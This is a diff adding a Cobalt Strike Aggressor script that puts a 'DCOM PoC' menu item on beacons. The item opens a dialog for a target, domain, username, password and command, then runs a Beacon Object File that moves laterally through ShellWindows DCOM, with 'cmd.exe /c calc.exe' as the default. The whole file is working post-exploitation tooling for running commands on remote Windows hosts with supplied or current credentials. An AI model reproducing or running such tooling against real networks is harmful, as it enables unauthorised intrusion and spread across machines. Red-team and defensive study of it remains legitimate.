@@ -1,0 +1,67 @@
+
+sub callback {
+	local('$bid $handle $data $args $IsCurrent $username $password $target $command $domain $parameters')
+	println("Dialog was actioned. Button: $2 Values: $3");
+	
+	$target = $3['target'];
+	$username = $3['username'];
+	$password = $3['password'];
+	$domain = $3['domain'];
+	$command = $3['cmd'];
+	$bid = $3['bid'];
+	$parameters = $3['parameters'];
+
+
+	#Parse args
+	if($username -eq ""){
+#you want to use the current user	
+	$IsCurrent = 0;
+		
+		} else {
+		$IsCurrent = 1;
+		}
+		
+		
+		#Read BOF
+		$handle = openf(script_resource("Aggtest.o"));
+		$data   = readb($handle, -1);
+		closef($handle);
+		
+		#pack args
+		$args   = bof_pack($bid, "ZZZZZZi", $target, $domain, $username, $password, $command, $parameters, $IsCurrent);
+		
+		#annoucement
+		btask($bid, "Running DCOM BOF PoC");
+				
+		#Execute it
+		beacon_inline_execute($bid, $data, "go", $args);
+	
+}
+
+
+sub OpenDcomDialog{
+	$dialog = dialog("DCOM BoF", %(bid => $1, target => "",username => "", password => "", cmd => "c:\\\\windows\\\\system32\\\\cmd.exe", parameters => "/c calc.exe"), &callback);
+		dialog_description($dialog, "BOF to move laterally using DCOM. Leave Domain, username, and password empty if you want to use the current user");
+		drow_text($dialog, "target",  "Target:");
+		drow_text($dialog, "domain", "Domain:");
+		drow_text($dialog, "username", "Username:");
+		drow_text($dialog, "password", "Password:");
+		drow_text($dialog, "cmd", "Command:");
+		drow_text($dialog, "parameters", "Parameters:");
+		dbutton_action($dialog, "Launch");		
+		dialog_show($dialog);
+}
+
+
+
+popup beacon_bottom {
+	menu "DCOM PoC" {
+			item "ShellWindows DCOM"{
+				local('$bid');
+	foreach $bid ($1) {
+		OpenDcomDialog($bid);
+	}
+
+			}
+		}	
+	}
